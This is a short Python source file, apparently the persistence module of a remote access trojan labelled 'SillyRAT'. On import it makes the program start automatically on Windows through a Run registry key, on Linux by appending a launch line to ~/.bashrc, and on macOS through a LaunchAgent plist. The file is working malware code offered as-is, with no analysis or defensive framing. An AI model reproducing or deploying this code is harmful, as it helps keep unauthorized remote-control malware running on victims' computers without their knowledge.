#mods/persistence.py
class Persistence:
    @staticmethod
    def install():
        try:
            if platform.system() == "Windows":
                import winreg
                exe = sys.executable
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                     r"Software\Microsoft\Windows\CurrentVersion\Run",
                                     0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "winsRAT", 0, winreg.REG_SZ, exe)
                winreg.CloseKey(key)
            elif platform.system() == "Linux":
                rc_path = os.path.expanduser("~/.bashrc")
                with open(rc_path, 'a') as rc:
                    rc.write(f"\npython3 {sys.argv[0]} &\n")
            elif platform.system() == "Darwin":
                plist = os.path.expanduser("~/Library/LaunchAgents/com.sillyrat.agent.plist")
                content = f"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\">
<dict>
    <key>Label</key><string>SillyRAT</string>
    <key>ProgramArguments</key><array><string>{sys.executable}</string><string>{sys.argv[0]}</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>"""
                with open(plist, 'w') as f:
                    f.write(content)
        except Exception as e:
            print(f"[!] Persistence error: {e}")


Persistence.install()
